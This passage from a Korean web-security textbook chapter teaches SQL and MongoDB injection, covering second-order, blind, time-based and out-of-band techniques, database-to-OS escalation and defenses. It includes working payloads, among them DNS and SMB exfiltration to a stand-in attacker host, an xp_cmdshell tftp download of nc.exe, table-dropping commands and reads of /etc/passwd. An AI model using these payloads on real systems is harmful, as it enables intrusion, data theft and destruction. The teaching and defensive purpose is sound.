그러나 데이터베이스에 **저장된** 사용자명은 리터럴 문자열 `foo'`다. 이중화 이스케이프는 데이터가 데이터베이스로 들어가는 지점에서만 쓰였기 때문이다. 이제 비밀번호 변경 기능이 저장된 사용자명을 읽어 새 질의를 만들면,

```sql
SELECT password FROM users WHERE username = 'foo''
```

저장된 `foo'`가 그대로 박혀 따옴표가 어긋나고, SQL 인젝션 결함이 되살아난다. 공격자는 이를 악용해, 가입 시 다음 사용자명을 등록한다.

```
' OR 1 IN (SELECT password FROM users WHERE username='admin')--
```

가입 단계는 안전하게 처리되지만, 비밀번호를 바꾸려 하면 인젝션된 질의가 실행되어 admin의 비밀번호가 오류 메시지로 노출된다(`Syntax error converting the varchar value '...' to a column of data type int`).

이것이 **단순 입력 검증**과 **경계 검증(boundary validation)** 의 차이를 드러내는 실패다(→ 43.5). 데이터를 신뢰 경계에 들어오는 순간 한 번 정제하고 그 뒤로는 안전하다고 가정하면, 데이터가 저장소를 거쳐 다시 질의로 흘러들 때 방어가 무너진다. 이스케이프는 데이터가 특정 경계를 넘는 그 순간에만 의미를 갖는데, 저장·재사용 과정에서 데이터는 원래 형태로 돌아온다. 옳은 접근은 데이터가 SQL 질의를 만나는 **모든** 경계에서 구조와 데이터를 분리하는 것이며, 그 방법이 27.9절의 파라미터화 질의다.

## 27.6 고급 익스플로잇 — 블라인드, 시간 기반, out-of-band, 조건부 오류

지금까지의 공격은 인젝션한 질의 결과를 되돌려받을 수단 — `UNION`이나 오류 메시지 — 이 있었다. 인식이 높아지면서 이런 상황은 점점 드물어졌다. 결과를 쉽게 회수할 수 없는 인젝션이 늘어난 것이다. 이 절은 그 문제를 다루는 여러 방법이다.

> **주의.** 모든 공격자가 데이터 탈취에 관심 있는 것은 아니다. MS-SQL에서 단 12자 `'shutdown--`으로 데이터베이스를 끌 수 있고, `'drop table users--`로 테이블을 지울 수 있다.

### 27.6.1 숫자로 데이터 회수하기

문자열 필드는 안전하지만 숫자 필드가 취약하고, 회수 채널이 숫자 응답뿐인 경우가 있다. 두 함수를 조합한다.

- `ASCII` — 입력 문자의 ASCII 코드 반환
- `SUBSTRING`(Oracle은 `SUBSTR`) — 입력의 부분 문자열 반환

`SUBSTRING('Admin',1,1)`은 `A`를, `ASCII('A')`는 65를 반환하므로, `ASCII(SUBSTRING('Admin',1,1))`은 65를 반환한다. 이로써 문자열을 한 글자씩 잘라 숫자로 회수해, 스크립트로 대량의 문자열 데이터를 한 바이트씩 재구성한다.

### 27.6.2 대역 외(out-of-band) 채널 이용

질의 결과도 오류도 브라우저로 돌아오지 않을 때, 데이터베이스의 내장 기능으로 **공격자 자신의 컴퓨터로 네트워크 연결**을 만들어 데이터를 실어 보낸다. 방법은 데이터베이스와 권한에 크게 의존한다.

**MS-SQL.** 구버전에서 `OpenRowSet`으로 외부 데이터베이스에 연결해 데이터를 넣는다. 방화벽 통과 확률을 높이려 포트 80을 지정할 수 있다.

```sql
INSERT INTO OPENROWSET('SQLOLEDB',
  'DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein',
  'SELECT * FROM foo') VALUES (@@version)
```

**Oracle.** 저권한 사용자도 접근 가능한 기본 기능이 많다. `utl_http`는 임의 HTTP 요청을 보낸다(프록시·쿠키·리다이렉트·인증 지원). `utl_smtp`는 이메일로 대량 데이터를 보내고, `utl_tcp`는 임의 TCP 소켓을 연다. 특히 `utl_inaddr`는 호스트명을 IP로 해석하는 기능인데, 이를 이용해 **임의 DNS 질의**를 공격자 서버로 보낸다.

```
/employees.asp?EmpNo=7521'||UTL_INADDR.GET_HOST_NAME((SELECT PASSWORD FROM DBA_USERS WHERE NAME='SYS')||'.mdattacker.net')
```

이는 SYS 사용자의 비밀번호 해시를 서브도메인으로 붙인 DNS 질의를 낸다.

```
DCB748A5BC5390F2.mdattacker.net
```

DNS가 채널이 되는 이 구조는 우연이 아니다. 2.3절에서 DNS 해석의 흐름 — 리졸버가 권한 서버까지 재귀적으로 질의를 올려 보내는 과정 — 을 봤다. 그 흐름의 어느 지점에서든 **질의된 호스트명 자체가 공격자에게 도달한다.** 공격자는 자기가 통제하는 도메인의 권한 서버를 세워 두기만 하면, 데이터베이스가 뱉는 모든 DNS 질의의 서브도메인에서 유출 데이터를 읽는다. HTTP가 방화벽에 막혀도 DNS는 대개 나가므로, DNS 채널이 HTTP 채널보다 성공률이 높다. 데이터를 옮기도록 설계되지 않은 프로토콜이, 그 이름 해석 구조 때문에 데이터 유출 채널이 되는 것이다.

**MySQL.** `SELECT ... INTO OUTFILE`로 질의 출력을 파일로 보내되, UNC 경로로 공격자 컴퓨터의 SMB 공유에 쓴다.

```sql
SELECT * INTO OUTFILE '\\\\mdattacker.net\\share\\output.txt' FROM users
```

### 27.6.3 추론(inference) — 조건부 응답

대역 외 채널이 없을 때(방화벽이 아웃바운드를 막을 때) 인젝션 지점만으로 데이터를 뽑는다. 핵심은 **인젝션한 질의로 조건에 따라 감지 가능한 동작을 유발하고, 그 동작 여부로 정보를 추론**하는 것이다.

취약한 로그인에서 다음 두 입력은 전혀 다른 결과를 낸다.

```
admin' AND 1=1--       -- admin으로 로그인 (조건 참)
admin' AND 1=2--       -- 로그인 실패 (조건 거짓)
```

이 동작 통제를, 데이터베이스 내부 조건의 참/거짓을 추론하는 수단으로 쓴다.

```
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 65--   -- 참이면 로그인
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 66--   -- 거짓이면 실패
```

각 문자의 ASCII 코드 범위를 순회하며 문자열 전체를 한 바이트씩 뽑는다.

### 27.6.4 조건부 오류 유발

인젝션한 질의가 애플리케이션 동작에 영향을 주지 않을 때(로깅 메커니즘, 처리되지 않는 서브·배치 질의) 감지 가능한 차이를 만들기 어렵다. David Litchfield가 고안한 기법은 **조건에 따라 데이터베이스 오류를 유발**하는 것이다. 오류는 HTTP 500이나 오류 메시지로 대개 외부에서 감지된다.

핵심은 데이터베이스가 필요한 부분만 평가한다는 성질이다. `SELECT X FROM Y WHERE C`에서 조건 `C`가 참인 행에서만 `X`가 평가된다. 따라서 구문적으로는 유효하지만 평가되면 오류를 내는 표현 `X`(예: `1/0`)를 찾으면, 오류의 유무로 임의 조건 `C`를 검사할 수 있다.

```sql
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username='DBSNMP')='DBSNMP'
```

`DBSNMP` 사용자가 존재하면 `1/0`이 평가되어 오류가 난다. 존재하지 않으면 `WHERE`가 참이 아니라 `1/0`이 평가되지 않아 오류가 없다. 이 기법은 서브 질의를 넣을 수 있는 곳이면 어디서든 통한다: `(SELECT 1 WHERE <<조건>> OR 1/0=0)`. 27.3절에서 본 `ORDER BY` 인젝션의 익스플로잇이 바로 이것이다.

```
/search.jsp?department=20&sort=(SELECT 1/0 FROM dual WHERE (SELECT SUBSTR(MAX(object_name),1,1) FROM user_objects)='Y')
```

### 27.6.5 시간 지연

결과도, 대역 외 채널도, 동작 차이도, 감지 가능한 오류도 없을 때 마지막 수단은 **시간 지연**이다. Chris Anley와 Sherief Hammad가 고안한 이 기법은, 조건에 따라 시간 지연을 유발하는 질의를 던지고 응답 시간을 측정한다. 지연이 있으면 조건이 참이다. 응답 내용이 두 경우에 동일해도, 지연의 유무로 한 비트를 뽑는다.

**표 27-2. 데이터베이스별 시간 지연 유발**

| 데이터베이스 | 방법 | 예시 |
|---|---|---|
| MS-SQL | `WAITFOR DELAY` | `IF (SELECT user)='sa' WAITFOR DELAY '0:0:5'` |
| MySQL (≥5.0.12) | `SLEEP` | `SELECT IF(user() LIKE 'root@%', SLEEP(5), 'false')` |
| MySQL (<5.0.12) | `BENCHMARK` | `SELECT IF(user() LIKE 'root@%', BENCHMARK(50000,SHA1('test')), 'false')` |
| PostgreSQL | `pg_sleep` | `pg_sleep(5)` |
| Oracle | `utl_http` 타임아웃 | `SELECT 'a'||UTL_HTTP.REQUEST('http://madeupserver.com') FROM dual` |

조건부 응답 때처럼 문자별로 순회하되, 응답 차이 대신 지연을 유발한다.

```
IF ASCII(SUBSTRING('Admin',1,1)) = 65 WAITFOR DELAY '0:0:5'
```

비트 단위로 나누면 요청 수를 줄인다. `POWER`와 비트 AND(`&`)로 각 비트를 검사한다.

```
IF (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,0))) > 0 WAITFOR DELAY '0:0:5'   -- 첫 비트
IF (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,1))) > 0 WAITFOR DELAY '0:0:5'   -- 둘째 비트
```

시간 지연은 **초기 탐침**에도 유용하다. 완전 블라인드 상황 — 결과도 오류도 안 보이는 — 에서 표준 기법이 취약점을 놓칠 때, 긴 지연(`WAITFOR DELAY '0:30:0'--`)을 각 파라미터에 넣고 응답 시간을 재는 것이 가장 믿을 만하다.

## 27.7 SQL을 넘어 — DB 권한 상승, OS 명령 실행, 파일 접근

SQL 인젝션의 성공은 대개 애플리케이션 데이터의 완전한 장악을 뜻한다. 대부분의 애플리케이션이 모든 DB 접근에 단일 계정을 쓰고 사용자 간 분리를 애플리케이션 계층에만 두기 때문이다. 그러나 여기서 공격을 더 밀 이유가 많다. 데이터베이스를 다른 애플리케이션과 공유한다면 그것들의 데이터에, 데이터베이스 서버의 운영체제에, 나아가 보호된 내부망의 다른 시스템에 도달할 수 있다.

**MS-SQL.** 가장 악명 높은 것은 기본 내장된 `xp_cmdshell` 저장 프로시저다. DBA 권한 사용자가 운영체제 명령을 `cmd.exe`처럼 실행하게 한다.

```sql
master..xp_cmdshell 'ipconfig > foo.txt'
```

MS-SQL은 기본적으로 `LocalSystem`으로 도므로 공격자는 대개 운영체제를 완전히 장악한다. `xp_regread`, `xp_regwrite`로 레지스트리도 다룬다. MS-SQL 2005 이후는 기본 잠금이 걸려 있지만, 애플리케이션의 DB 계정이 충분히 높으면 `sp_configure`로 재활성화한다.

```sql
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure 'xp_cmdshell', '1'
RECONFIGURE WITH OVERRIDE
```

**Oracle.** 소프트웨어 자체의 취약점이 많아, 임의 질의가 가능하면 대개 DBA로 상승할 수 있다. DBA 권한으로 실행되면서 그 안에 SQL 인젝션 결함을 가진 내장 프로시저들이 있었다(예: 2006년 7월 패치 이전의 `SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES`에 `grant dba to public`을 인젝션). `utl_file`은 서버 파일시스템을 읽고 쓴다. 2010년 David Litchfield는 `dbms_java.runjava`로 OS 명령을 실행하는 방법을 보였다.

**MySQL.** 오용 가능한 내장 기능이 상대적으로 적다. `file_priv` 권한이 있으면 파일시스템을 읽고 쓴다. `load_file`로 임의 파일을 읽고,

```sql
SELECT load_file('/etc/passwd')
```

`SELECT ... INTO OUTFILE`로 임의 질의 결과를 파일로 쓴다. MySQL이 데이터를 평문 파일로 저장하므로 파일을 직접 열어 DB 접근 제어를 우회할 수도 있고, 사용자 정의 함수(UDF)로 임의 바이너리를 실행할 수도 있다.

> **28장과의 경계.** 여기서 다룬 OS 명령·파일 접근은 **데이터베이스를 경유한** 것이다. 공격자는 SQL 인젝션으로 데이터베이스에 도달한 뒤, 데이터베이스가 가진 운영체제 접근 기능(`xp_cmdshell`, `utl_file`, `INTO OUTFILE`)을 딛고 운영체제로 넘어간다. 이것은 28장이 다루는 것 — 애플리케이션이 사용자 입력을 **직접** 셸 명령이나 파일 경로에 넣는 OS 명령 인젝션·경로 순회(→ 28.1, 28.3) — 과 다르다. 28장에서는 데이터베이스가 경로에 없다. 두 장은 같은 목적지(운영체제)에 이르지만, **경유하는 중간 컴포넌트가 다르다.** 이 장은 DB를 통해, 28장은 애플리케이션에서 곧장.

> **흔한 오해.** 많은 DBA가 인증을 요구하는 공격에 대해 데이터베이스를 방어할 필요가 없다고 여긴다 — 신뢰하는 애플리케이션만 접근하니까. 이는 애플리케이션의 결함이 제3자를 애플리케이션의 보안 컨텍스트로 데이터베이스와 상호작용하게 할 가능성을 무시한다. 모든 데이터베이스에는 권한 상승 경로가 있으며, 인증된 공격자에 대한 방어가 필요하다.

## 27.8 SQL 익스플로잇 도구와 구문·오류 레퍼런스

### 27.8.1 도구

많은 익스플로잇 기법이 소량 데이터를 뽑기 위해 대량 요청을 수행한다. 이를 자동화하는 도구가 있다. 대부분 다음 접근을 쓴다. 파라미터를 무차별 대입해 인젝션 지점을 찾고, 닫는 괄호·주석·키워드를 붙여 취약 필드 위치를 정하고, `UNION` 공격으로 열 개수와 `varchar` 열을 알아내고, 안 되면 불리언 조건(`AND 1=1`, `AND 1=2`)으로, 그것도 안 되면 시간 지연으로 데이터를 뽑는다.

저자들이 선호하는 것은 **sqlmap**으로, MySQL·Oracle·MS-SQL 등을 공격하고 `UNION`·오류·블라인드 추출과 파일 회수·`xp_cmdshell` 명령 실행 등 상승 기법을 지원한다. 가장 좋은 사용법 중 하나는 `--sql-shell` 옵션이다. SQL 프롬프트를 주고, 뒤에서 필요한 `UNION`·오류·블라인드 인젝션을 알아서 수행한다.

```
C:\sqlmap>sqlmap.py -u http://example-books.com/employees?EmpNo=7369 --union-use --sql-shell -p EmpNo
...
back-end DBMS: Oracle
sql-shell> select banner from v$version
[*] CORE 9.2.0.1.0 Production
[*] Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production
```

> **주의.** 이 도구들은 주로 **익스플로잇** 도구다 — 이미 식별·이해한 인젝션 지점에서 데이터를 뽑는 데 최적이지, 인젝션을 찾고 익스플로잇하는 마법 탄환이 아니다. 도구의 하드코딩된 공격이 통하려면 그 앞뒤에 SQL 구문을 덧붙여야 하는 경우가 흔하다. 인터셉팅 프록시로 도구의 요청·응답을 관찰하고, 실패하면 완전히 통제 가능한 중첩 서브 질의를 만들어 도구가 그 안에 인젝션하게 하는 것이 가장 쉽다: Oracle `'||(select 1 from dual where 1=[input])`, MS-SQL `(select 1 where 1=[input])`.

### 27.8.2 SQL 구문 레퍼런스

세 주요 데이터베이스의 인젝션에 필요한 구문 요약이다.

**표 27-3. SQL 구문 대조 (Oracle / MS-SQL / MySQL)**

| 작업 | Oracle | MS-SQL | MySQL |
|---|---|---|---|
| 주석 | `--` | `--` | `-- ` (뒤 공백) 또는 `#` |
| 인라인 주석 | `/* */` | `/* */` | `/* */`, 키워드 내부도 가능 |
| 문자열 연접 | `'a'||'b'` | `'a'+'b'` | `'a' 'b'` (공백) 또는 `CONCAT('a','b')` |
| 문자→ASCII | `ASCII('A')` | `ASCII('A')` | `ASCII('A')` |
| ASCII→문자 | `CHR(65)` | `CHAR(65)` | `CHAR(65)` |
| 부분 문자열 | `SUBSTR('abc',1,1)` | `SUBSTRING('abc',1,1)` | `SUBSTRING('abc',1,1)` |
| 버전 문자열 | `SELECT banner FROM v$version` | `@@version` | `@@version` |
| 현재 사용자 | `SELECT user FROM dual` | `SELECT user` / `system_user` | `SELECT user()` |
| 필수 더미 테이블 | `DUAL` | (불필요) | (불필요) |
| 테이블·열 메타데이터 | `all_tab_columns` / `user_tab_columns` | `information_schema.columns` | `information_schema.columns` |
| 시간 지연 | `UTL_HTTP.REQUEST` 타임아웃 | `WAITFOR DELAY '0:0:5'` | `SLEEP(5)` / `BENCHMARK(...)` |
| 조건부 오류 | `1/0` | `1/0` | `1/0` |
| 배치 질의 | 미지원(서브 질의 사용) | `;` 지원(생략 가능) | 미지원 |
| OS 명령 | `dbms_java.runjava` 등 | `xp_cmdshell` | UDF |
| 파일 읽기/쓰기 | `utl_file` | (제한적) | `load_file` / `INTO OUTFILE` |

### 27.8.3 오류 메시지 레퍼런스

인젝션 중 만나는 오류의 의미를 아는 것은 탐침과 익스플로잇 양쪽에 중요하다.

**표 27-4. 대표 오류 메시지 해석**

| 상황 | Oracle | MS-SQL |
|---|---|---|
| 따옴표 안 닫힘 | `ORA-01756: quoted string not properly terminated` | `Unclosed quotation mark before the character string ...` |
| UNION 열 개수 불일치 | `ORA-01789: query block has incorrect number of result columns` | `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.` |
| UNION 타입 불일치 | `ORA-01790: expression must have same datatype as corresponding expression` | `Syntax error converting the varchar value '...' to a column of data type int.` |
| 일반 구문 오류 | `ORA-00933: SQL command not properly ended` | `Incorrect syntax near ...` |

특히 MS-SQL의 타입 변환 오류(`Syntax error converting the varchar value 'X' to ... int`)는 **오류 메시지 자체가 데이터 유출 채널**이 된다. 조건부로 문자열 `X`를 정수 열에 변환시키면, 그 문자열이 오류에 그대로 실려 나온다. 이 오류 기반 추출과 정보 노출의 관계는 30.1절에서 상세히 다룬다.

## 27.9 SQL 인젝션 방어 — 파라미터화 질의, 최소 권한, 심층 방어

여러 발현 형태와 익스플로잇의 복잡함에도, SQL 인젝션은 일반적으로 막기 쉬운 축에 든다. 그러나 대응책 논의는 자주 오도되어, 부분적으로만 효과 있는 방어에 의존하는 경우가 많다.

### 27.9.1 부분적으로만 효과 있는 대책

- **작은따옴표 이스케이프(이중화).** 두 상황에서 실패한다. 숫자 데이터는 따옴표로 감싸지 않으므로 따옴표 없이도 SQL을 넣을 수 있다. 그리고 2차 인젝션에서, 안전하게 이중화된 따옴표가 데이터를 다시 쓸 때 원래 형태로 돌아온다(→ 27.5.4).
- **저장 프로시저.** 보안·성능 이점이 있지만 인젝션을 보장 방지하지 못한다. 저장 프로시저 자체 코드에 인젝션 결함이 있을 수 있고, 안전한 프로시저라도 안전하지 못하게 호출되면 소용없다. `exec sp_RegisterUser 'joe', 'secret'`에서 비밀번호에 `foo'; exec master..xp_cmdshell 'tftp attacker.com GET nc.exe'--`을 넣으면 배치 질의가 실행된다.

### 27.9.2 파라미터화 질의 — 왜 효과가 있는가

대부분의 데이터베이스와 개발 플랫폼이 신뢰할 수 없는 입력을 안전하게 다루는 API를 제공한다. **파라미터화 질의(parameterized query, 준비된 문/prepared statement)** 에서 SQL 문 구성은 두 단계로 나뉜다.

1. 애플리케이션이 질의의 **구조**를 지정하고, 각 사용자 입력 자리에 플레이스홀더를 둔다.
2. 애플리케이션이 각 플레이스홀더의 **내용**을 지정한다.

취약한 코드와 안전한 코드를 나란히 보자.

```java
// 취약: 사용자 데이터를 문 안에 직접 이어 붙인다
String queryText = "SELECT ename, sal FROM emp WHERE ename = '";
queryText += request.getParameter("name");
queryText += "'";
stmt = con.createStatement();
rs = stmt.executeQuery(queryText);
```

```java
// 안전: 구조를 먼저 확정하고, 값은 나중에 바인딩한다
String queryText = "SELECT ename, sal FROM emp WHERE ename = ?";
stmt = con.prepareStatement(queryText);   // 여기서 질의 구조가 고정된다
stmt.setString(1, request.getParameter("name"));  // 값은 데이터로만 취급
rs = stmt.executeQuery();
```

이 방어가 왜 통하는지를 우연이 아니라 **구조로** 이해해야 한다. 이 장 전체의 논지는 "데이터와 구분자가 같은 채널을 공유한다"였다. 인젝션이 성립한 이유는, 인터프리터가 하나의 문자열을 받아 그 내용만으로 구조와 데이터를 나눴기 때문이다. 데이터에 구분자를 섞으면 구조가 바뀌었다.

파라미터화 질의는 이 채널을 **둘로 쪼갠다.** `prepareStatement`가 호출되는 순간, 데이터베이스는 플레이스홀더만 있는 질의를 받아 **파싱을 끝내고 구조를 확정한다.** 이 시점에 사용자 값은 아직 존재하지도 않는다. 질의의 문법 트리 — 어디가 `WHERE`이고 어디가 비교이고 어디가 값 자리인지 — 가 이미 굳었다. 그 다음 `setString`으로 넘기는 값은, 이미 확정된 트리의 한 잎(leaf)에 **데이터로서만** 채워진다. 값 안에 작은따옴표가 있든 `OR 1=1`이 있든 `--`가 있든, 그것들은 이제 구조를 정하는 문법 요소로 **다시 해석되지 않는다.** 파싱이 이미 끝났기 때문이다.

한 문장으로 압축하면 이렇다. **질의 구조를 먼저 확정하고 데이터를 나중에 바인딩하므로, 데이터가 구조를 바꿀 수 없다.** 이스케이프가 "위험한 문자를 무해하게 만들려는" 사후적·목록적 시도라면(그래서 놓친 문자·재사용 경로에서 실패한다), 파라미터화는 데이터와 구분자를 애초에 **다른 채널에 둔다.** 인젝션이 발 디딜 구조적 틈 자체가 사라진다.

**전제.** 파라미터화가 효과적이려면 몇 가지를 지켜야 한다.

- **모든 질의에 써야 한다.** 개발자가 "사용자 입력일 때만" 판단해 선택적으로 쓰면, 2차 공격을 놓치고(이미 처리된 데이터를 신뢰), 어떤 데이터가 사용자 통제인지 오판한다. 애플리케이션 전체에 강제하는 편이 훨씬 안전하다.
- **모든 항목을 파라미터화해야 한다.** 대부분을 안전히 다루면서 한둘을 구조 문자열에 이어 붙이면 소용없다.
- **테이블·열 이름은 플레이스홀더로 지정할 수 없다.** 이것들은 질의 구조의 일부이기 때문이다. 사용자 입력으로 정해야 한다면 **알려진 값의 화이트리스트**로 검증하고, 일치하지 않는 입력은 거부한다.
- **`ORDER BY`의 `ASC`/`DESC` 같은 키워드도 플레이스홀더로 못 쓴다.** 마찬가지로 엄격한 화이트리스트 검증을 적용한다. 27.3절에서 `ORDER BY` 인젝션을 특별히 경계한 이유가 이것이다 — 파라미터화로 막히지 않는 유일한 벡터다.

### 27.9.3 심층 방어

전방 방어가 어떤 이유로 실패할 때를 대비해 세 층을 둔다.

- **최소 권한.** 애플리케이션은 데이터베이스에 접근할 때 가능한 가장 낮은 권한을 쓴다. DBA 권한은 거의 필요 없다. 읽기 90%라면 쓰기 없는 계정으로 수행하고, 특정 질의가 `orders` 테이블만 필요하면 그만큼만 허용된 계정을 쓴다. 이렇게 하면 잔존 인젝션 결함의 영향이 크게 준다. 이 원칙은 접근 제어의 다층 권한 모델(→ 24.6)의 데이터베이스 계층 적용이며, 자격증명·계정의 정기 회전·재포장 관점(→ 46.7, 3R)과 함께 운영된다.
- **불필요 기능 제거.** 엔터프라이즈 데이터베이스의 방대한 기본 기능은 임의 SQL 실행 능력을 얻은 공격자에게 무기가 된다. 가능한 한 제거·비활성화한다. 숙련된 공격자가 우회할 수 있어도, 상당한 장애물이 된다.
- **패치.** 벤더 보안 패치를 시의적절하게 평가·적용해 소프트웨어 자체 취약점을 막는다.

그리고 오류 메시지를 브라우저로 흘리지 않는 것도 방어의 일부다. 오류 기반 추출과 UNION 열 탐색이 모두 오류 메시지를 지렛대로 삼기 때문이다(→ 30.1).

## 27.10 도메인 프리미티브로 인젝션을 구조적으로 막기

27.9절의 파라미터화 질의는 인젝션을 막는 올바른 방법이다. 그러나 그것은 **질의를 만드는 그 지점**에서 규율을 요구한다. 개발자가 모든 질의에서, 모든 항목에 대해, 잊지 않고 파라미터를 써야 한다. 큰 애플리케이션에서 이 규율은 반드시 어딘가에서 새어 나간다 — WAHH가 지적한 대로, "판단이 개입하는 순간" 결함이 태어난다. 그렇다면 더 근본적인 물음이 있다. **애초에 검증되지 않은 문자열이 질의에 도달할 수 있는 구조를 없앨 수는 없는가.**

이것이 이 책의 고유한 기여이며, 27.9절을 넘어 Part IX에서 온전히 전개될 관점이다. 이 절은 그 관점을 인젝션의 맥락에서 미리 제시한다.

### 27.10.1 문자열이 아니라 불변식을 가진 타입

Secure by Design의 핵심 도구는 **도메인 프리미티브(domain primitive)** 다. 도메인 프리미티브는 도메인 주도 설계의 값 객체(value object)를 보안 관점에서 살짝 비튼 것으로, 두 성질을 요구한다. **불변식(invariant)** 을 가지며, 그 불변식이 **생성 시점에 강제된다**는 것이다. 정의가 얼마나 엄격한지, 그것이 존재한다면 그것은 유효하다. 유효하지 않으면 존재할 수 없다.

지금까지 이 장에서 위험했던 모든 값 — 검색어, 사용자명, 정렬 파라미터 — 은 **문자열(string)** 이었다. 언어의 원시 타입이다. 그리고 문자열은 무엇이든 담을 수 있다. `Wiley`도 담고 `' OR 1=1--`도 담는다. 언어 원시 타입은 아무 불변식이 없어서, 그것을 받는 코드는 그 안에 무엇이 들었는지 매번 다시 검증해야 한다. 그리고 그 검증을 한 곳이라도 잊으면 인젝션이 생긴다.

도메인 프리미티브는 이 그림을 뒤집는다. 온라인 서점에서 책을 식별하는 값을 생각하자. 그것을 `String isbn`으로 다루는 대신 `ISBN`이라는 도메인 프리미티브로 모델링한다.

```java
public final class ISBN {
    private final String value;

    public ISBN(final String value) {
        notNull(value);
        // 불변식: ISBN-13은 13자리 숫자이며 체크섬을 만족한다
        isTrue(value.matches("\\d{13}"));
        isTrue(isValidChecksum(value));
        this.value = value;
    }

    public String value() { return value; }
}
```

이 타입의 핵심은 **생성자가 유일한 관문**이라는 것이다. `ISBN` 인스턴스가 존재한다는 사실 자체가, 그 값이 13자리 숫자이고 체크섬을 만족한다는 증명이다. `' OR 1=1--`으로는 `ISBN`을 만들 수 없다 — 생성자가 예외를 던지기 때문이다. 따라서 코드 어딘가에서 `ISBN` 타입의 값을 받았다면, 그것이 SQL의 구분자 문자를 담고 있을 가능성은 **타입 수준에서 배제된다.**

### 27.10.2 검증되지 않은 문자열이 질의에 도달할 수 없게

여기서 결정적 전환이 일어난다. 데이터 접근 계층의 메서드 시그니처를 이렇게 쓴다.

```java
// 취약할 수 있는 형태: 무엇이든 담긴 문자열을 받는다
Book findBook(String isbn);

// 강화된 형태: 유효한 ISBN만 받는다
Book findBook(ISBN isbn);
```

두 번째 시그니처에서 `findBook`은 애초에 **유효하지 않은 값을 넘겨받을 수 없다.** 호출자가 `ISBN`을 만들지 못하면 이 메서드를 호출할 방법이 없다. 검증은 시스템의 경계 — 사용자 입력이 처음 `ISBN` 생성자를 통과하려 시도하는 그 지점 — 에서 **단 한 번** 일어나고, 그 뒤로 이 값은 시스템 어디를 흘러 다니든 유효함이 보장된다. 이것이 SBD가 말하는 API 강화(hardening APIs)다. 모든 메서드의 인자와 반환값이 정의상 유효하면, 별도 노력 없이 모든 메서드에 입력·출력 검증이 붙는다.

파라미터화 질의(27.9)와 도메인 프리미티브의 관계를 정확히 보자. 이 둘은 경쟁하지 않는다. 파라미터화 질의는 **데이터가 구조를 바꾸지 못하게** 하고(채널 분리), 도메인 프리미티브는 **애초에 오염된 데이터가 그 자리까지 오지 못하게** 한다(타입 경계). 파라미터화가 질의 지점의 규율이라면, 도메인 프리미티브는 그 규율이 필요 없도록 시스템의 형태 자체를 바꾼다. 검증되지 않은 문자열은 `ISBN`, `Quantity`, `EmailAddress` 같은 타입의 벽에 막혀, 질의를 만드는 코드에 **문자열로서 도달하지 못한다.** 인젝션은 검증되지 않은 문자열이 인터프리터에 닿을 때 생기는데, 그런 문자열이 시스템 깊숙이 존재하지 않게 되는 것이다.

이 관점은 여기서 개요만 제시한다. 도메인 프리미티브의 정의와 불변식(→ 44.1), 컨텍스트 경계가 의미를 정하는 방식(→ 44.2), 도메인 프리미티브 라이브러리 구축과 API 강화(→ 44.3), 도메인을 공개적으로 노출하지 않기(→ 44.4)는 44장이 상세히 다룬다. 이 장에서 붙잡을 것은 하나다 — **인젝션을 막는 가장 깊은 방법은 위험한 문자를 걸러내는 것이 아니라, 위험한 값이 존재할 수 없는 타입 구조를 만드는 것이다.**

> **이 절이 뒷받침하는 것**
>
> - 도메인 프리미티브의 불변식·생성 시점 강제 → **44.1~44.4**가 상세화. 이 절은 인젝션 맥락의 예고.
> - 경계에서 한 번 검증하고 이후 신뢰하는 구조 → **43.5**(경계 검증), **27.5.4**의 2차 인젝션이 드러낸 단순 검증의 실패에 대한 근본적 답.
> - 타입으로 오염을 차단하는 사고 → **44.7**(테인트 분석)과 연결.

## 27.11 NoSQL 인젝션 — MongoDB

**NoSQL**은 표준 관계형 아키텍처에서 벗어난 다양한 데이터 저장소를 가리킨다. 키/값 매핑으로 데이터를 표현하고 고정 스키마에 의존하지 않는다. 웹 애플리케이션 보안의 관점에서 핵심은 **애플리케이션이 데이터를 어떻게 질의하는가**다 — 그것이 어떤 인젝션이 가능한지를 정한다. SQL이 제품 간에 대체로 비슷한 언어를 쓰는 것과 달리, NoSQL은 제각각의 질의 방식을 갖는다. 키/값 조회, XPath, 또는 JavaScript 같은 프로그래밍 언어가 흔히 쓰인다.

많은 NoSQL 데이터베이스가 기존 프로그래밍 언어를 질의 메커니즘으로 삼는다. 질의가 문자열 연접으로 만들어지면 공격자는 데이터 컨텍스트를 탈출해 질의 구문을 바꿀 수 있다. 여기서도 구조는 같다 — 데이터와 구분자가 같은 채널을 공유하되, 이번 채널은 SQL이 아니라 JavaScript다.

MongoDB의 로그인 예를 보자.

```php
$js = "function() {
  return this.username == '$username' && this.password == '$password'; }";
$obj = $collection->findOne(array('$where' => $js));
```

`$js`는 사용자명과 비밀번호를 담아 동적으로 만들어지는 JavaScript 함수다. 공격자는 사용자명에 다음을 넣어 인증을 우회한다.

```
Marcus'//
```

결과 함수는 이렇게 된다.

```javascript
function() { return this.username == 'Marcus'//' && this.password == 'aaa'; }
```

JavaScript에서 `//`는 줄 나머지를 주석 처리하므로, 비밀번호 검사가 사라진다. SQL의 `--`와 정확히 같은 역할이다. 주석 없이 함수가 항상 참을 반환하게 하려면 사용자명에 다음을 넣는다.

```
a' || 1==1 || 'a'=='a
```

JavaScript는 이를 `(this.username == 'a' || 1==1) || ('a'=='a' && this.password == 'aaa')`로 해석해, 첫 논리합이 항상 참이므로 컬렉션의 모든 사용자가 매칭된다. SQL의 `' OR 1=1--`의 JavaScript 판이다.

> **이 책의 범위를 넘어서**
>
